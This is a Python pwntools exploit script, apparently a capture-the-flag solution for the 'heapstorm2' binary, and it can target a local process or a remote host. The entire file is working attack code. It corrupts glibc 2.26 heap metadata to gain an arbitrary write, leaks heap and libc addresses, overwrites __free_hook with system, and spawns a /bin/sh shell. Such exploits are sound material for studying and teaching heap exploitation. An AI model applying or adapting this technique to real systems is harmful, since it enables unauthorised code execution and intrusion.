#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./heapstorm2"
locallibc = "../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so"

def allocate(size):
    io.recvuntil("Command: ")
    io.sendline(str(1))
    io.recvuntil("Size: ")
    io.sendline(str(size))

def update(idx, size, content):
    io.recvuntil("Command: ")
    io.sendline(str(2))
    io.recvuntil("Index: ")
    io.sendline(str(idx))
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.recvuntil("Content: ")
    io.send(content)

def delete(idx):
    io.recvuntil("Command: ")
    io.sendline(str(3))
    io.recvuntil("Index: ")
    io.sendline(str(idx))

def view(idx):
    io.recvuntil("Command: ")
    io.sendline(str(4))
    io.recvuntil("Index: ")
    io.sendline(str(idx))

def exp():
    allocate(0x20)      # 0
    allocate(0x400)     # 1
    allocate(0x28)      # 2
    allocate(0xf10)     # 3
    allocate(0x20)      # 4

    update(3, 0xef8, b"A"*0xef0 + p64(0xf00))
    delete(3)
    update(2, 0x28-12, b"A"*(0x28-12))
    allocate(0x20)      # 3
    allocate(0x20)      # 5
    allocate(0x400)     # 6
    allocate(0x20)      # 7
    allocate(0x400)     # 8
    allocate(0x20)      # 9

    delete(3)
    delete(4)
    delete(6)
    delete(8)

    allocate(0x500)     # 3
    allocate(0x500)     # 4

    update(4, 0x80, b"A"*0x58 + p64(0x401) + p64(0) + p64(0x13370800-0x20+3) + p64(0) + p64(0x13370800+8-0x20))
    delete(1)
    allocate(0x20)      # 1

    update(4, 0x90, b"A"*0x28 + p64(0x31) + b"A"*0x28 + p64(0x31) + b"A"*0x28 + p64(0x31))
    delete(5)
    update(4, 0x40, b"A"*0x28 + p64(0x31) + p64(0x13370800-0x10)*2)

    allocate(0x48)      # 5
    update(5, 0x30, p64(0)*3 + p64(0x13377331) + p64(0x13370830) + p64(0x100))
    
    update(0, 0x10, p64(0x133707f3) + p64(0x8))
    view(1)
    io.recvuntil("Chunk[1]: ")
    heap_base = u64(io.recv(8)) - 0x30

    update(0, 0x10, p64(heap_base+0x4a0+0x10) + p64(0x8))
    log.debug("heap: 0x%x" % (heap_base+0x4a0+0x10))
    view(1)
    io.recvuntil("Chunk[1]: ")
    libc_base = u64(io.recv(8)) - 0x3ABC80

    update(0, 0x10, p64(libc_base+libc.sym["__free_hook"]) + p64(0x20))
    update(1, 0x8, p64(libc_base+libc.sym["system"]))
    log.debug("system: 0x%x" % (libc_base+libc.sym["system"]))
    # gdb.attach(io, "b *$rebase(0x1331)")
    update(0, 8, b"/bin/sh\x00")
    delete(0)

    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()
